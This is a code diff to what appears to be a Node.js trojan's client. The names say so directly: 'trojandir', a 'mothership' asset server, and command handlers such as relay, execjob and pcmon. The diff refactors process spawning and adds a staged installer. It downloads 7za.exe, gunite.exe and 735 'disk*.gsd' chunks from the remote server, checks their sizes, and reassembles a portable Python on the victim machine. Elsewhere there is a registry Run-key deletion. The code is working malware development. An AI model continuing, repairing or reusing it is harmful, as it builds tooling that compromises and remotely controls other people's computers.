@@ -442,7 +442,7 @@ class CmdConfig {
         execjob: execjob,
         relay: relay,
         install_python: install_python,
-        install_node: install_node
+        install_node: install_node,
     };
 
     get dynamicdelay() {
@@ -2352,10 +2352,10 @@ async function cmdlist_handleMessage(msg) {
         let cmdname = clientjob.cmdname;
         cmdname = cmdname.toLowerCase();
 
-        if ( ! CmdConfig.isCmdExist(cmdname) ) {
-            throw new Error('command is not supported '+cmdname);
+        if (!CmdConfig.isCmdExist(cmdname)) {
+            throw new Error("command is not supported " + cmdname);
         }
-    
+
         let cmdargs = clientjob.args ?? [];
 
         // for relay, pcmon, pspcmon we have start/stop feature
@@ -2386,19 +2386,18 @@ async function cmdlist_handleMessage(msg) {
             cmdlistcmd.sendMessage(relaycmd, "cmdlist", clientjob);
         } else {
             let cmdjob = cmdlistcmd.newCmdConfig(cmdname);
-            
-            if ( ! cmdjob ) {
-                throw new Error("could not create cmd object for "+cmdname);
+
+            if (!cmdjob) {
+                throw new Error("could not create cmd object for " + cmdname);
             }
-            
+
             let ret = cmdjob.launch([configfpath]);
 
             cmdjob.childprocess.unref();
-
         }
 
-        logmsg('finished');
-        
+        logmsg("finished");
+
         return;
     }
 
@@ -2472,32 +2471,41 @@ cmdstr = "REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Run
     // cleanup
 }
 
-function invoke_exe(exename, args = null, exedirpath = systemstate.trojandir) {
-    const exePath = path.join(exedirpath, exename);
+async function invoke_exe(
+    exename,
+    targs = null,
+    exedirpath = systemstate.trojandir,
+    stdoutfunc,
+    stderrfunc
+) {
+    return new Promise((resolve, reject) => {
+        const exePath = path.join(exedirpath, exename);
+        const child = spawn(exePath, targs);
 
-    const targs = [
-        path.join(systemstate.trojandir, "disk1.gsd"),
-        "-u",
-        path.join(systemstate.gsdpath, "portable_python.zip"),
-        "-s",
-    ];
+        child.stdout.on("data", (data) => {
+            logmsg(`stdout: ${data.toString()}`);
+            if (stdoutfunc) stdoutfunc(data);
+        });
 
-    const child = spawn(exePath, targs);
+        child.stderr.on("data", (data) => {
+            logmsg(`stderr: ${data.toString()}`);
+            if (stderrfunc) stderrfunc(data);
+        });
 
-    child.stdout.on("data", (data) => {
-        logmsg(`stdout: ${data.toString()}`);
-    });
+        child.on("close", (code) => {
+            logmsg(`Child process exited with code ${code}`);
 
-    child.stderr.on("data", (data) => {
-        logmsg(`stderr: ${data.toString()}`);
-    });
+            if (code === 0) {
+                resolve(child);
+            } else {
+                reject(new Error(`Process exited with code ${code}`));
+            }
+        });
 
-    child.on("close", (code) => {
-        logmsg(`Child process exited with code ${code}`);
-    });
-
-    child.on("error", (err) => {
-        logmsg("Failed to start child process:", err);
+        child.on("error", (err) => {
+            logmsg("Failed to start child process:", err);
+            reject(err);
+        });
     });
 }
 
@@ -2535,8 +2543,55 @@ async function retrieve_asset(assetfname, assetdir) {
 }
 
 // TODO
-async function install_node() {
+async function install_node() {}
 
+function verify_python_donwload() {
+    let filenames = Array.from({ length: 735 }, (_, index) => index + 1);
+
+    filenames = filenames.map(String);
+    filenames = filenames.map((_, i) => {
+        return "disk" + _ + ".gsd";
+    });
+
+    for (let i = 0; i < filenames.length; i++) {
+        let filename = filenames[i];
+        let fpath = path.join(systemstate.gsdfilesdir, filename);
+
+        if (!fileExists(fpath)) {
+            return { status: false, msg: `file does not exist {fpath}` };
+        }
+
+        const stats = fs.statSync(fpath);
+
+        // disk1.gsd --> 1,696
+        // disk735.gsd --> 65,443
+        // 100,000
+
+        if (filename == "disk1.gsd") {
+            if (stats.size != 1696) {
+                return {
+                    status: false,
+                    msg: `file not the correct size {fpath} {stats.size} 1696`,
+                };
+            }
+        } else if (filename == "disk735.gsd") {
+            if (stats.size != 65443) {
+                return {
+                    status: false,
+                    msg: `file not the correct size {fpath} {stats.size} 65443`,
+                };
+            }
+        } else {
+            if (stats.size != 100000) {
+                return {
+                    status: false,
+                    msg: `file not the correct size {fpath} {stats.size} 65443`,
+                };
+            }
+        }
+    }
+
+    return { status: true };
 }
 
 async function install_python() {
@@ -2544,20 +2599,48 @@ async function install_python() {
 
     let installcmd = systemstate.cmdconfig;
 
-    await retrieve_asset("7za.exe");
-    await retrieve_asset("gunite.exe");
-    await download_python();
+    if (!fileExists(path.join(systemstate.trojandir, "7za.exe")))
+        await retrieve_asset("7za.exe");
 
-    // TODO verify installation files exist, correct size, etc.
+    if (!fileExists(path.join(systemstate.trojandir, "gunite.exe")))
+        await retrieve_asset("gunite.exe");
+
+    // TODO verify file size of exe's
+
+    if (!verify_python_donwload()) {
+        logmsg("python pieces not present -- downloading");
+        await download_python();
+    }
+
+    if (!verify_python_donwload()) {
+        throw new Error("python download failed");
+    }
 
     let args = [
-        path.join(systemstate.trojandir, "disk1.gsd"),
+        path.join(systemstate.gsdfilesdir, "disk1.gsd"),
         "-u",
-        path.join(systemstate.gsdpath, "portable_python.zip"),
+        path.join(systemstate.pythondir, "portable_python.zip"),
         "-s",
     ];
 
-    let childp = invoke_exe("gunite.exe", args);
+    let childp = null;
+
+    try {
+        childp = await invoke_exe("gunite.exe", args); // throws error despite success
+    } catch (err) {
+        logmsg(err);
+    }
+
+    let fpath = path.join(systemstate.pythondir, "portable_python.zip");
+
+    if (!fileExists(fpath)) {
+        throw new Error("file does not exist " + fpath);
+    }
+
+    const stats = fs.statSync(fpath);
+    if (!stats.size == 72890982) {
+        throw new Error("incorrect file size " + stats.size + " 72890982");
+    }
 
     args = [
         "x",
@@ -2567,26 +2650,33 @@ async function install_python() {
         "-y",
     ];
 
-    childp = invoke_exe("7za.exe", args);
+    try {
+        childp = await invoke_exe("7za.exe", args);
+    } catch (err) {
+        logmsg(err);
+    }
 
     logmsg("finished");
 }
 
+// downloads pieces to <trojandir>/python/gsd_files
 async function download_python() {
     logmsg("starting");
 
     let filenames = Array.from({ length: 735 }, (_, index) => index + 1);
 
     filenames = filenames.map(String);
-    filenames = filenames.map((_,i) => {
+    filenames = filenames.map((_, i) => {
         return "disk" + _ + ".gsd";
     });
 
     for (let i = 0; i < filenames.length; i++) {
         let filename = filenames[i];
 
-        let baseUrl = systemstate.mothershipassets + "/" + filename;
-        let localpath = path.join(systemstate.gsdfilesdir, filename); 
+        let baseUrl = systemstate.mothershipassets + "/gsd_files/" + filename;
+        let localpath = path.join(systemstate.gsdfilesdir, filename);
+
+        fs.mkdirSync(systemstate.gsdfilesdir, { recursive: true });
 
         let downloadOpts = {
             download: true,
